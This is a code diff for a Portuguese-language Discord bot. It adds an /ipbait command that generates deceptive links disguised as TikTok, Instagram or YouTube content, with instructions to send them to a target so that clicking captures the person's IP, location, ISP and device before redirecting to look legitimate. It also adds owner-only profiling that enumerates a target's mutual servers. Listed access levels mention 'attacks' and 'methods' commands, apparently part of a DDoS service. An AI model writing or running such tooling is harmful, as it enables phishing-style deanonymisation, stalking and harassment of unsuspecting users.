@@ -487,19 +487,57 @@ const COMMANDS = [
     )
     .addBooleanOption(opt =>
       opt.setName("private").setDescription("Resposta visível apenas para você? (padrão: não)").setRequired(false)
-    )
+    ),
+
+  // ── /ipbait ───────────────────────────────────────────────────────────────
+  new SlashCommandBuilder()
+    .setName("ipbait")
+    .setDescription("🪤 IP Tracker Bait — gera link camuflado para capturar IP (owner/admin only)")
     .addStringOption(opt =>
-      opt.setName("tracker_theme")
-        .setDescription("🪤 Tema do link bait (IP Tracker) — owner only")
+      opt.setName("theme")
+        .setDescription("Aparência do link bait")
         .setRequired(false)
         .addChoices(
-          { name: "🎵 TikTok",    value: "tiktok"    },
-          { name: "📷 Instagram", value: "instagram" },
-          { name: "▶️ YouTube",   value: "youtube"   },
-          { name: "𝕏 X / Twitter", value: "x"        },
-          { name: "👻 Snapchat",  value: "snapchat"  },
-          { name: "🎮 Discord",   value: "discord"   },
+          { name: "🎵 TikTok",      value: "tiktok"    },
+          { name: "📷 Instagram",   value: "instagram" },
+          { name: "▶️ YouTube",     value: "youtube"   },
+          { name: "𝕏 X / Twitter", value: "x"         },
+          { name: "👻 Snapchat",    value: "snapchat"  },
+          { name: "🎮 Discord",     value: "discord"   },
         )
+    )
+    .addUserOption(opt =>
+      opt.setName("target").setDescription("Usuário Discord alvo (opcional — apenas para registro)").setRequired(false)
+    )
+    .addStringOption(opt =>
+      opt.setName("label").setDescription("Nome do alvo personalizado (aparece nos logs)").setRequired(false)
+    )
+    .addBooleanOption(opt =>
+      opt.setName("private").setDescription("Resposta visível apenas para você? (padrão: sim)").setRequired(false)
+    ),
+
+  // ── /admins ───────────────────────────────────────────────────────────────
+  new SlashCommandBuilder()
+    .setName("admins")
+    .setDescription("👑 Painel de Administradores — gerenciar owners e admins do bot (owner only)")
+    .addSubcommand(sub =>
+      sub.setName("list")
+        .setDescription("📋 Ver todos os owners e admins autorizados")
+    )
+    .addSubcommand(sub =>
+      sub.setName("add-owner")
+        .setDescription("➕ Promover usuário a owner (acesso total) — apenas bootstrap owner")
+        .addUserOption(opt => opt.setName("user").setDescription("Usuário a promover").setRequired(true))
+    )
+    .addSubcommand(sub =>
+      sub.setName("add-admin")
+        .setDescription("➕ Adicionar admin autorizado — owner only")
+        .addUserOption(opt => opt.setName("user").setDescription("Usuário a adicionar como admin").setRequired(true))
+    )
+    .addSubcommand(sub =>
+      sub.setName("remove")
+        .setDescription("➖ Remover owner ou admin — owner only")
+        .addUserOption(opt => opt.setName("user").setDescription("Usuário a remover").setRequired(true))
     ),
 
 ].map(c => c.toJSON());
@@ -2571,7 +2609,7 @@ async function handleWhois(interaction: ChatInputCommandInteraction): Promise<vo
     });
   }
 
-  // ── Option 10: Cross-guild ban check ─────────────────────────────────────
+  // ── Option 10: Cross-guild ban check (owner only) ────────────────────────
   const crossBanResults: string[] = [];
   const isCallerOwner = isOwner(interaction.user.id, interaction.user.username);
   if (isCallerOwner && targetUser.id !== interaction.user.id) {
@@ -2594,38 +2632,51 @@ async function handleWhois(interaction: ChatInputCommandInteraction): Promise<vo
     });
   }
 
-  // ── IP Tracker bait link (owner-only) ─────────────────────────────────────
-  if (isCallerOwner) {
-    try {
-      const selectedTheme = interaction.options.getString("tracker_theme") ?? "tiktok";
-      const THEME_LABELS: Record<string, string> = {
-        tiktok: "🎵 TikTok", instagram: "📷 Instagram", youtube: "▶️ YouTube",
-        x: "𝕏 X / Twitter", snapchat: "👻 Snapchat", discord: "🎮 Discord",
-      };
-      const trackerRes = await fetch(`${API_BASE}/api/tracker/gen`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          userId: targetUser.id,
-          username: targetUser.username,
-          targetName: targetUser.displayName,
-          theme: selectedTheme,
-        }),
-      }).catch(() => null);
-      if (trackerRes?.ok) {
-        const { token, url, theme } = await trackerRes.json() as { token: string; url: string; theme: string };
-        embedTech.addFields({
-          name: `🪤 IP TRACKER — ${THEME_LABELS[theme] ?? theme.toUpperCase()} BAIT (Owner)`,
-          value: [
-            `**Token:** \`${token}\``,
-            `**Link camuflado:** ${url}`,
-            `**Aparência:** Link de ${THEME_LABELS[theme] ?? theme} — convince como conteúdo real`,
-            `**Resultado:** \`/panel ipcheck token:${token}\``,
-          ].join("\n"),
-          inline: false,
-        });
-      }
-    } catch { /* tracker unavailable — skip silently */ }
+  // ── OSINT: Mutual servers + shared metadata (owner only) ─────────────────
+  if (isCallerOwner && targetUser.id !== interaction.user.id) {
+    const mutualGuilds: string[] = [];
+    for (const g of botClient!.guilds.cache.values()) {
+      try {
+        await g.members.fetch({ user: targetUser.id });
+        mutualGuilds.push(`**${g.name}** (\`${g.id}\`) — ${g.memberCount ?? "?"} membros`);
+      } catch { /* not in this guild */ }
+    }
+    embedTech.addFields({
+      name: `🌐 SERVIDORES MÚTUOS (${mutualGuilds.length})`,
+      value: mutualGuilds.length > 0
+        ? mutualGuilds.slice(0, 10).join("\n") + (mutualGuilds.length > 10 ? `\n*...e mais ${mutualGuilds.length - 10}*` : "")
+        : "*Nenhum servidor mútuo detectado — ou privileged intent não habilitado*",
+      inline: false,
+    });
+  }
+
+  // ── Behavioral fingerprint (open source intelligence) ────────────────────
+  const behaviorLines: string[] = [];
+  if (fetched.bot) behaviorLines.push("🤖 **Conta bot** — perfil autônomo, sem comportamento humano");
+  if (hasDefaultAvatar) behaviorLines.push("📷 **Avatar padrão** — nunca personalizou a conta");
+  if (accountAgeDays < 30) behaviorLines.push(`⏱️ **Conta nova** — criada há apenas ${accountAgeDays} dias`);
+  if (roleCount === 0 && interaction.guild) behaviorLines.push("🎭 **Sem cargos** — membro sem nenhuma função atribuída");
+  if (totalInviteUses > 10) behaviorLines.push(`📬 **${totalInviteUses}** pessoas convidadas — recrutador ativo`);
+  if (isAdmin) behaviorLines.push("👑 **Administrador** — controle total do servidor");
+  if (member?.isCommunicationDisabled()) behaviorLines.push("⏳ **Em timeout ativo** — foi sancionado recentemente");
+  if (member?.premiumSince) behaviorLines.push("💎 **Server booster** — investimento genuíno no servidor");
+  if (streamingActivity) behaviorLines.push("📺 **Em stream ativo** — criador de conteúdo");
+  if (listeningActivity?.name === "Spotify") behaviorLines.push("🎵 **Ouvindo Spotify** — usuário com integração configurada");
+  if (behaviorLines.length > 0) {
+    embedTech.addFields({
+      name: "🧠 PERFIL COMPORTAMENTAL",
+      value: behaviorLines.join("\n"),
+      inline: false,
+    });
+  }
+
+  // ── IP Tracker quick-link hint (owner only) ────────────────────────────────
+  if (isCallerOwner && !fetched.bot) {
+    embedTech.addFields({
+      name: "🪤 IP TRACKER",
+      value: `Use \`/ipbait target:@${fetched.username}\` para gerar um link bait com resultado capturando o IP real deste usuário.`,
+      inline: false,
+    });
   }
 
   embedIdentity.setFooter({ text: `${AUTHOR} • Geass Intelligence Division ▸ Página 1/3 — Use as setas para navegar` });
@@ -2840,6 +2891,289 @@ async function handlePanel(interaction: ChatInputCommandInteraction): Promise<vo
     } catch {
       await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Falha ao consultar o tracker.")] });
     }
+    return;
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// /ipbait COMMAND HANDLER
+// ═══════════════════════════════════════════════════════════════════════════
+async function handleIpBait(interaction: ChatInputCommandInteraction): Promise<void> {
+  const callerId   = interaction.user.id;
+  const callerName = interaction.user.username;
+
+  if (!isOwner(callerId, callerName) && !isMod(callerId, callerName)) {
+    await interaction.reply({
+      embeds: [buildErrorEmbed("⛔ ACESSO NEGADO", `**${callerName}** — Apenas donos e admins autorizados podem gerar links bait.\n\n*"O Geass não concede este poder a qualquer um."*`)],
+      flags: MessageFlags.Ephemeral,
+    });
+    return;
+  }
+
+  const isPrivate   = interaction.options.getBoolean("private") ?? true;
+  await interaction.deferReply({ flags: isPrivate ? MessageFlags.Ephemeral : undefined });
+
+  const theme       = interaction.options.getString("theme")  ?? "tiktok";
+  const targetUser  = interaction.options.getUser("target");
+  const customLabel = interaction.options.getString("label");
+
+  const targetName = customLabel
+    ?? targetUser?.displayName
+    ?? targetUser?.username
+    ?? "target";
+
+  const THEME_LABELS: Record<string, string> = {
+    tiktok: "🎵 TikTok", instagram: "📷 Instagram", youtube: "▶️ YouTube",
+    x: "𝕏 X / Twitter", snapchat: "👻 Snapchat", discord: "🎮 Discord",
+  };
+  const THEME_REDIRECT: Record<string, string> = {
+    tiktok: "https://www.tiktok.com/trending",
+    instagram: "https://www.instagram.com/",
+    youtube: "https://www.youtube.com/",
+    x: "https://x.com/home",
+    snapchat: "https://www.snapchat.com/",
+    discord: "https://discord.com/app",
+  };
+
+  try {
+    const trackerRes = await fetch(`${API_BASE}/api/tracker/gen`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        userId:     targetUser?.id     ?? callerId,
+        username:   targetUser?.username ?? callerName,
+        targetName,
+        theme,
+      }),
+    });
+
+    if (!trackerRes.ok) {
+      await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", `API retornou ${trackerRes.status}. Verifique se o API Server está online.`)] });
+      return;
+    }
+
+    const { token, url } = await trackerRes.json() as { token: string; url: string; theme: string };
+    const themeLabel   = THEME_LABELS[theme] ?? theme.toUpperCase();
+    const themeRedirect = THEME_REDIRECT[theme] ?? "https://discord.com/app";
+
+    const embed = new EmbedBuilder()
+      .setColor(COLORS.PURPLE)
+      .setTitle(`🪤 IP TRACKER BAIT — ${themeLabel}`)
+      .setDescription(`*"Cada link é uma armadilha. O Geass captura o que os olhos não veem."*`)
+      .addFields(
+        {
+          name: "🎭 Tema / Aparência",
+          value: [
+            `**Plataforma:** ${themeLabel}`,
+            `**Convence como:** Conteúdo real de ${themeLabel} — link orgânico`,
+            `**Redireciona para:** ${themeRedirect}`,
+          ].join("\n"),
+          inline: false,
+        },
+        {
+          name: "🎯 Alvo Registrado",
+          value: targetUser
+            ? `<@${targetUser.id}> — \`${targetUser.username}\` (\`${targetUser.id}\`)`
+            : `*${targetName}*`,
+          inline: false,
+        },
+        {
+          name: "🔗 Link Camuflado",
+          value: url,
+          inline: false,
+        },
+        {
+          name: "🔑 Token de Rastreio",
+          value: `\`${token}\``,
+          inline: true,
+        },
+        {
+          name: "⏱️ Gerado em",
+          value: `<t:${Math.floor(Date.now() / 1000)}:R>`,
+          inline: true,
+        },
+        {
+          name: "📊 Ver Resultado",
+          value: `\`/panel ipcheck token:${token}\``,
+          inline: false,
+        },
+        {
+          name: "ℹ️ Como funciona",
+          value: [
+            "1️⃣ Envie o link ao alvo (WhatsApp, DM, chat)",
+            "2️⃣ Ao clicar, o IP, localização, ISP e dispositivo são capturados instantaneamente",
+            "3️⃣ Use `/panel ipcheck` com o token para ver os dados capturados",
+            "4️⃣ O link redireciona automaticamente após 1.8s — parece legítimo",
+          ].join("\n"),
+          inline: false,
+        },
+      )
+      .setTimestamp()
+      .setFooter({ text: `${AUTHOR} • Geass Intelligence Division — IP Tracker v2` });
+
+    if (targetUser?.displayAvatarURL) {
+      embed.setThumbnail(targetUser.displayAvatarURL({ size: 256 }));
+    }
+
+    await interaction.editReply({ embeds: [embed] });
+
+    console.log(`[IP TRACKER] 🪤 Bait gerado por ${callerName} (${callerId}) — tema: ${theme} — alvo: ${targetName} — token: ${token.slice(0, 8)}...`);
+  } catch (err) {
+    await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", `Falha ao gerar o link bait: ${err instanceof Error ? err.message : "erro desconhecido"}`)] });
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// /admins COMMAND HANDLER — gerenciar owners e admins do bot
+// ═══════════════════════════════════════════════════════════════════════════
+async function handleAdmins(interaction: ChatInputCommandInteraction): Promise<void> {
+  const callerId   = interaction.user.id;
+  const callerName = interaction.user.username;
+  const callerIsOwner = isOwner(callerId, callerName);
+  const callerIsMod   = isMod(callerId, callerName);
+
+  if (!callerIsOwner && !callerIsMod) {
+    await interaction.reply({
+      embeds: [buildErrorEmbed("⛔ ACESSO NEGADO", `**${callerName}** — Apenas donos e admins autorizados podem usar este comando.\n\n*"O poder não é concedido — é tomado pelos dignos."*`)],
+      flags: MessageFlags.Ephemeral,
+    });
+    return;
+  }
+
+  await interaction.deferReply({ flags: MessageFlags.Ephemeral });
+  const sub = interaction.options.getSubcommand();
+
+  // ── LIST ──────────────────────────────────────────────────────────────────
+  if (sub === "list") {
+    const owners = listPanelOwners();
+    const mods   = listPanelMods();
+
+    const ownerDisplay = [
+      `\`${BOOTSTRAP_OWNER_USERNAME}\` — 👑 **Bootstrap Owner** (hardcoded, acesso máximo)`,
+      ...owners.map(id => `<@${id}> — \`${id}\``),
+    ];
+    const modDisplay = mods.length > 0
+      ? mods.map(id => `<@${id}> — \`${id}\``)
+      : ["*Nenhum admin adicionado*"];
+
+    const embed = new EmbedBuilder()
+      .setColor(COLORS.PURPLE)
+      .setTitle("👑 PAINEL DE ADMINISTRADORES — GEASS BRITÂNIA")
+      .setDescription(`*"Aqueles que servem sob o olho do Geass — os confiáveis da Order."*\n\n` +
+        `**Total de owners:** \`${owners.length + 1}\` | **Total de admins:** \`${mods.length}\``)
+      .addFields(
+        {
+          name: `👑 OWNERS (${owners.length + 1}) — Acesso Total`,
+          value: ownerDisplay.join("\n").slice(0, 1024),
+          inline: false,
+        },
+        {
+          name: `🛡️ ADMINS (${mods.length}) — Acesso Limitado`,
+          value: modDisplay.join("\n").slice(0, 1024),
+          inline: false,
+        },
+        {
+          name: "🔐 Níveis de Acesso",
+          value: [
+            "**👑 Owner** — acesso completo: ataques, painel, ipbait, whois, admins",
+            "**🛡️ Admin** — acesso ao ipbait, whois, painel básico",
+            "**🔵 Membro** — comandos públicos apenas (attack, methods, info, help)",
+          ].join("\n"),
+          inline: false,
+        },
+      )
+      .setTimestamp()
+      .setFooter({ text: `${AUTHOR} • Solicitado por ${callerName}` });
+
+    await interaction.editReply({ embeds: [embed] });
+    return;
+  }
+
+  // ── ADD-OWNER ─────────────────────────────────────────────────────────────
+  if (sub === "add-owner") {
+    if (!callerIsOwner) {
+      await interaction.editReply({ embeds: [buildErrorEmbed("⛔ PERMISSÃO INSUFICIENTE", "Apenas owners podem promover outros owners.")] });
+      return;
+    }
+    const target = interaction.options.getUser("user", true);
+    if (target.id === callerId) {
+      await interaction.editReply({ embeds: [buildErrorEmbed("AVISO", "Você já é owner.")] });
+      return;
+    }
+    addPanelOwner(target.id);
+    await interaction.editReply({
+      embeds: [new EmbedBuilder()
+        .setColor(0xFFD700)
+        .setTitle("👑 OWNER ADICIONADO")
+        .setDescription(`<@${target.id}> (\`${target.username}\`) agora tem acesso de **owner** ao bot.\n\n*"Um novo aliado do Geass foi reconhecido."*`)
+        .addFields({ name: "Adicionado por", value: `<@${callerId}> (\`${callerName}\`)`, inline: true })
+        .setTimestamp()
+        .setFooter({ text: AUTHOR })],
+    });
+    console.log(`[ADMINS] 👑 ${target.username} (${target.id}) promovido a owner por ${callerName} (${callerId})`);
+    return;
+  }
+
+  // ── ADD-ADMIN ─────────────────────────────────────────────────────────────
+  if (sub === "add-admin") {
+    if (!callerIsOwner) {
+      await interaction.editReply({ embeds: [buildErrorEmbed("⛔ PERMISSÃO INSUFICIENTE", "Apenas owners podem adicionar admins.")] });
+      return;
+    }
+    const target = interaction.options.getUser("user", true);
+    if (isOwner(target.id, target.username)) {
+      await interaction.editReply({ embeds: [buildErrorEmbed("AVISO", "Este usuário já é owner — nível superior ao de admin.")] });
+      return;
+    }
+    addPanelMod(target.id);
+    await interaction.editReply({
+      embeds: [new EmbedBuilder()
+        .setColor(0x5865F2)
+        .setTitle("🛡️ ADMIN ADICIONADO")
+        .setDescription(`<@${target.id}> (\`${target.username}\`) agora é **admin** autorizado do bot.\n\n*"Mais um soldado da Order — bem-vindo ao Geass."*`)
+        .addFields(
+          { name: "Adicionado por", value: `<@${callerId}> (\`${callerName}\`)`, inline: true },
+          { name: "Acesso concedido", value: "ipbait, whois, painel básico", inline: true },
+        )
+        .setTimestamp()
+        .setFooter({ text: AUTHOR })],
+    });
+    console.log(`[ADMINS] 🛡️ ${target.username} (${target.id}) adicionado como admin por ${callerName} (${callerId})`);
+    return;
+  }
+
+  // ── REMOVE ────────────────────────────────────────────────────────────────
+  if (sub === "remove") {
+    if (!callerIsOwner) {
+      await interaction.editReply({ embeds: [buildErrorEmbed("⛔ PERMISSÃO INSUFICIENTE", "Apenas owners podem remover acessos.")] });
+      return;
+    }
+    const target = interaction.options.getUser("user", true);
+    if (target.username === BOOTSTRAP_OWNER_USERNAME) {
+      await interaction.editReply({ embeds: [buildErrorEmbed("⛔ IMPOSSÍVEL", `O bootstrap owner \`${BOOTSTRAP_OWNER_USERNAME}\` é hardcoded e não pode ser removido.`)] });
+      return;
+    }
+    const wasOwner = listPanelOwners().includes(target.id);
+    const wasMod   = listPanelMods().includes(target.id);
+    removePanelOwner(target.id);
+    removePanelMod(target.id);
+
+    if (!wasOwner && !wasMod) {
+      await interaction.editReply({ embeds: [buildErrorEmbed("AVISO", `<@${target.id}> não está na lista de owners nem admins.`)] });
+      return;
+    }
+
+    const removedRole = wasOwner ? "owner" : "admin";
+    await interaction.editReply({
+      embeds: [new EmbedBuilder()
+        .setColor(0xFF6B6B)
+        .setTitle("➖ ACESSO REVOGADO")
+        .setDescription(`<@${target.id}> (\`${target.username}\`) teve o acesso de **${removedRole}** removido.\n\n*"O Geass não perdoa aqueles que perdem a confiança."*`)
+        .addFields({ name: "Removido por", value: `<@${callerId}> (\`${callerName}\`)`, inline: true })
+        .setTimestamp()
+        .setFooter({ text: AUTHOR })],
+    });
+    console.log(`[ADMINS] ➖ ${target.username} (${target.id}) removido da lista de ${removedRole} por ${callerName} (${callerId})`);
     return;
   }
 }
@@ -3241,6 +3575,10 @@ async function main(): Promise<void> {
         await handleWhois(interaction);
       } else if (commandName === "panel") {
         await handlePanel(interaction);
+      } else if (commandName === "ipbait") {
+        await handleIpBait(interaction);
+      } else if (commandName === "admins") {
+        await handleAdmins(interaction);
       }
     } catch (err) {
       console.error("[INTERACTION ERROR]", err);
